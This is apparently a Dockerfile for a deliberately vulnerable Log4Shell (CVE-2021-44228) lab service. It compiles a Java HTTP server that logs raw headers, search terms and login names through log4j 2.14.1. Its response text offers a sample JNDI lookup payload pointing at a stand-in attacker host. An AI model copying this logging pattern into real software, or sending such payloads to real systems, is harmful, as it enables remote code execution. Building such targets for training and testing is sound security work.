# Log4Shell Vulnerable Service (CVE-2021-44228)
# This simulates a Java application vulnerable to Log4j RCE
FROM eclipse-temurin:8-jdk

WORKDIR /app

# Install dependencies
RUN apt-get update && apt-get install -y curl netcat-openbsd && rm -rf /var/lib/apt/lists/*

# Download vulnerable Log4j version (2.14.1)
RUN mkdir -p /app/lib && \
    curl -L -o /app/lib/log4j-core-2.14.1.jar https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar && \
    curl -L -o /app/lib/log4j-api-2.14.1.jar https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar

# Create vulnerable application
RUN cat > /app/VulnApp.java << 'JAVA'
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.io.*;
import java.net.InetSocketAddress;

public class VulnApp {
    private static final Logger logger = LogManager.getLogger(VulnApp.class);

    public static void main(String[] args) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress(8090), 0);

        server.createContext("/", exchange -> {
            String userAgent = exchange.getRequestHeaders().getFirst("User-Agent");
            String xApiKey = exchange.getRequestHeaders().getFirst("X-Api-Key");
            String query = exchange.getRequestURI().getQuery();

            // VULNERABLE: User input logged directly
            logger.info("Request from User-Agent: " + userAgent);
            if (xApiKey != null) logger.info("API Key: " + xApiKey);
            if (query != null) logger.info("Query: " + query);

            String response = "Log4Shell Demo - Try: ${jndi:ldap://attacker.com/a}\n";
            response += "Vulnerable headers: User-Agent, X-Api-Key, X-Forwarded-For\n";
            response += "Vulnerable params: ?search=...\n";
            exchange.sendResponseHeaders(200, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        });

        server.createContext("/search", exchange -> {
            String query = exchange.getRequestURI().getQuery();
            String searchTerm = "";
            if (query != null && query.startsWith("q=")) {
                searchTerm = java.net.URLDecoder.decode(query.substring(2), "UTF-8");
            }

            // VULNERABLE: Search term logged directly
            logger.info("Search query: " + searchTerm);

            String response = "Searching for: " + searchTerm + "\n";
            exchange.sendResponseHeaders(200, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        });

        server.createContext("/login", exchange -> {
            String username = "";
            if ("POST".equals(exchange.getRequestMethod())) {
                BufferedReader br = new BufferedReader(new InputStreamReader(exchange.getRequestBody()));
                String line;
                while ((line = br.readLine()) != null) {
                    if (line.startsWith("username=")) {
                        username = java.net.URLDecoder.decode(line.substring(9), "UTF-8");
                    }
                }
            }

            // VULNERABLE: Username logged directly
            logger.info("Login attempt for user: " + username);

            String response = "Login failed for: " + username + "\n";
            exchange.sendResponseHeaders(401, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        });

        System.out.println("Log4Shell vulnerable server running on port 8090");
        server.start();
    }
}
JAVA

# Compile
RUN javac -cp "/app/lib/*" /app/VulnApp.java

EXPOSE 8090

CMD ["java", "-cp", "/app:/app/lib/*", "VulnApp"]
